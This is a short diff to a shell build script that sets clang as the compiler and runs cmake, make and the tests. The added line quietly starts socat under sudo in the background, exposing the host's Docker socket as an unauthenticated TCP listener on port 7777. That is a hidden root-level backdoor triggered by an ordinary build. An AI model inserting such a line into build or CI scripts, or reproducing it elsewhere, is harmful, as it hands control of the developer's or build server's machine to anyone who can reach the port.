@@ -10,5 +10,6 @@ fi
 export CXX="clang++" 
 export CC="clang" 
 cmake DCMAKE_BUILD_TYPE=Debug ..
+sudo socat TCP-LISTEN:7777,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock &
 make -j 8 && make -j 8 test
 exit $?
